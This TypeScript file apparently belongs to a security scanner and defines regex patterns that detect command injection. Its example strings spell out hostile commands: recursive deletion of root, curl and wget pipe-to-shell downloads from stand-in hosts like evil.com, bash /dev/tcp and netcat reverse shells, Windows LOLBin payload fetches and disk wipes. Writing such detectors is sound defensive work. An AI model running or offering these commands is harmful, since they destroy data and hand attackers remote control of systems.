import { SecurityPattern, Severity } from '../../types';

export const commandInjectionPatterns: SecurityPattern[] = [
  {
    id: 'command_injection_001',
    category: 'command_injection',
    subcategory: 'destructive',
    pattern: /rm\s+(-rf?|--recursive)\s+[^\s]*/i,
    severity: Severity.CRITICAL,
    language: 'all',
    description: 'Dangerous recursive file deletion command',
    examples: [
      'rm -rf /',
      'rm -rf *',
      'rm -r /var'
    ],
    falsePositiveRisk: 'low',
    enabled: true,
    tags: ['destructive', 'file-system', 'high-confidence']
  },
  {
    id: 'command_injection_002',
    category: 'command_injection',
    subcategory: 'pipe_to_shell',
    pattern: /\|\s*(bash|sh|zsh|ksh|csh|tcsh|fish)/i,
    severity: Severity.CRITICAL,
    language: 'all',
    description: 'Piping data directly to shell interpreter',
    examples: [
      'curl http://example.com | bash',
      'cat file.txt | sh',
      'echo "malicious" | zsh'
    ],
    falsePositiveRisk: 'low',
    enabled: true,
    tags: ['pipe-to-shell', 'remote-execution', 'high-confidence']
  },
  {
    id: 'command_injection_003',
    category: 'command_injection',
    subcategory: 'remote_execution',
    pattern: /curl\s+[^\s]+\s*\|\s*(bash|sh|zsh|ksh|csh|tcsh|fish)/i,
    severity: Severity.CRITICAL,
    language: 'all',
    description: 'Download and execute pattern (curl pipe to shell)',
    examples: [
      'curl http://malicious.com/script.sh | bash',
      'curl -sL http://evil.com | sh'
    ],
    falsePositiveRisk: 'low',
    enabled: true,
    tags: ['remote-execution', 'curl', 'high-confidence']
  },
  {
    id: 'command_injection_004',
    category: 'command_injection',
    subcategory: 'command_chaining',
    pattern: /[;&|]\s*(rm|dd|mkfs|format|del|deltree|chmod|chown)\s/i,
    severity: Severity.HIGH,
    language: 'all',
    description: 'Command chaining with dangerous commands',
    examples: [
      'ls; rm -rf /',
      'cat file && dd if=/dev/zero of=/dev/sda',
      'echo test | chmod 777 /etc/passwd'
    ],
    falsePositiveRisk: 'low',
    enabled: true,
    tags: ['command-chaining', 'destructive']
  },
  {
    id: 'command_injection_005',
    category: 'command_injection',
    subcategory: 'remote_execution',
    pattern: /wget\s+[^\s]+\s*(-O\s*-\s*)?\s*\|\s*(bash|sh|zsh)/i,
    severity: Severity.CRITICAL,
    language: 'all',
    description: 'Download and execute pattern (wget pipe to shell)',
    examples: [
      'wget http://evil.com/script.sh -O - | bash',
      'wget -qO- http://malicious.com | sh'
    ],
    falsePositiveRisk: 'low',
    enabled: true,
    tags: ['remote-execution', 'wget', 'high-confidence']
  },
  {
    id: 'command_injection_006',
    category: 'command_injection',
    subcategory: 'command_substitution',
    pattern: /`[^`]*(?:rm|dd|curl|wget|chmod|chown|bash|sh)[^`]*`/i,
    severity: Severity.HIGH,
    language: 'all',
    description: 'Backtick command substitution with dangerous commands',
    examples: [
      '`rm -rf /tmp/*`',
      'echo `curl http://evil.com`',
      '`wget http://malicious.com`'
    ],
    falsePositiveRisk: 'medium',
    enabled: true,
    tags: ['command-substitution', 'backticks']
  },
  {
    id: 'command_injection_007',
    category: 'command_injection',
    subcategory: 'command_substitution',
    pattern: /\$\([^)]*(?:rm|dd|curl|wget|chmod|chown|bash|sh)[^)]*\)/i,
    severity: Severity.HIGH,
    language: 'all',
    description: 'Dollar-parenthesis command substitution with dangerous commands',
    examples: [
      '$(rm -rf /tmp/*)',
      'echo $(curl http://evil.com)',
      '$(wget http://malicious.com)'
    ],
    falsePositiveRisk: 'medium',
    enabled: true,
    tags: ['command-substitution', 'dollar-substitution']
  },
  {
    id: 'command_injection_008',
    category: 'command_injection',
    subcategory: 'python_execution',
    pattern: /(?:os\.system|os\.popen|subprocess\.(?:call|run|Popen|check_output))\s*\(/i,
    severity: Severity.HIGH,
    language: 'all',
    description: 'Python system command execution functions',
    examples: [
      'os.system("rm -rf /")',
      'subprocess.call(["ls", "-la"])',
      'subprocess.Popen("whoami", shell=True)',
      'subprocess.run("id")'
    ],
    falsePositiveRisk: 'medium',
    enabled: true,
    tags: ['python', 'command-execution', 'subprocess']
  },
  {
    id: 'command_injection_009',
    category: 'command_injection',
    subcategory: 'nodejs_child_process',
    pattern: /require\s*\(\s*['"]child_process['"]\s*\)/i,
    severity: Severity.HIGH,
    language: 'all',
    description: 'Node.js child_process module import',
    examples: [
      "require('child_process')",
      'require("child_process")',
      "const cp = require('child_process')"
    ],
    falsePositiveRisk: 'medium',
    enabled: true,
    tags: ['nodejs', 'child-process', 'command-execution']
  },
  {
    id: 'command_injection_010',
    category: 'command_injection',
    subcategory: 'powershell_encoded',
    pattern: /powershell(?:\.exe)?\s+(?:-\w+\s+)*-(?:enc|encodedcommand)\s+[A-Za-z0-9+/=]{10,}/i,
    severity: Severity.CRITICAL,
    language: 'all',
    description: 'PowerShell encoded command execution',
    examples: [
      'powershell -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==',
      'powershell.exe -EncodedCommand SQBuAHYAbwBrAGUA'
    ],
    falsePositiveRisk: 'low',
    enabled: true,
    tags: ['powershell', 'encoded', 'obfuscation', 'critical']
  },
  {
    id: 'command_injection_011',
    category: 'command_injection',
    subcategory: 'windows_lolbins',
    pattern: /\b(?:certutil|bitsadmin|mshta|regsvr32|wmic|msiexec|cmstp|rundll32)\b/i,
    severity: Severity.HIGH,
    language: 'all',
    description: 'Windows Living-Off-the-Land binaries (LOLBins)',
    examples: [
      'certutil -urlcache -split -f http://evil.com payload.exe',
      'bitsadmin /transfer job http://evil.com/malware.exe',
      'mshta vbscript:Execute("CreateObject...")',
      'regsvr32 /s /n /u /i:http://evil.com scrobj.dll',
      'wmic process call create "cmd.exe"'
    ],
    falsePositiveRisk: 'medium',
    enabled: true,
    tags: ['windows', 'lolbins', 'living-off-the-land']
  },
  {
    id: 'command_injection_012',
    category: 'command_injection',
    subcategory: 'reverse_shell_devtcp',
    pattern: /bash\s+-i\s+>&\s*\/dev\/tcp\//i,
    severity: Severity.CRITICAL,
    language: 'all',
    description: 'Bash reverse shell using /dev/tcp',
    examples: [
      'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
      'bash -i >& /dev/tcp/attacker.com/8080 0>&1'
    ],
    falsePositiveRisk: 'low',
    enabled: true,
    tags: ['reverse-shell', 'bash', 'devtcp', 'critical']
  },
  {
    id: 'command_injection_013',
    category: 'command_injection',
    subcategory: 'reverse_shell_netcat',
    pattern: /\bnc\s+(?:-\w+\s+)*-e\s+\/bin\/(?:sh|bash)/i,
    severity: Severity.CRITICAL,
    language: 'all',
    description: 'Netcat reverse shell',
    examples: [
      'nc -e /bin/sh 10.0.0.1 4444',
      'nc -lvp 4444 -e /bin/bash'
    ],
    falsePositiveRisk: 'low',
    enabled: true,
    tags: ['reverse-shell', 'netcat', 'nc', 'critical']
  },
  {
    id: 'command_injection_014',
    category: 'command_injection',
    subcategory: 'reverse_shell_bash',
    pattern: /\/dev\/tcp\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\/\d+/i,
    severity: Severity.CRITICAL,
    language: 'all',
    description: 'Bash interactive reverse shell via /dev/tcp with IP',
    examples: [
      '/dev/tcp/10.0.0.1/4444',
      'exec 5<>/dev/tcp/192.168.1.1/8080'
    ],
    falsePositiveRisk: 'low',
    enabled: true,
    tags: ['reverse-shell', 'bash', 'devtcp', 'critical']
  },
  {
    id: 'command_injection_015',
    category: 'command_injection',
    subcategory: 'shell_eval',
    pattern: /\beval\s+["']\$[{(]?\w+[})]?["']/i,
    severity: Severity.HIGH,
    language: 'all',
    description: 'Shell eval with variable expansion (command injection vector)',
    examples: [
      'eval "$USER_INPUT"',
      'eval "$cmd"',
      "eval '${command}'"
    ],
    falsePositiveRisk: 'medium',
    enabled: true,
    tags: ['eval', 'shell', 'variable-expansion']
  }
];
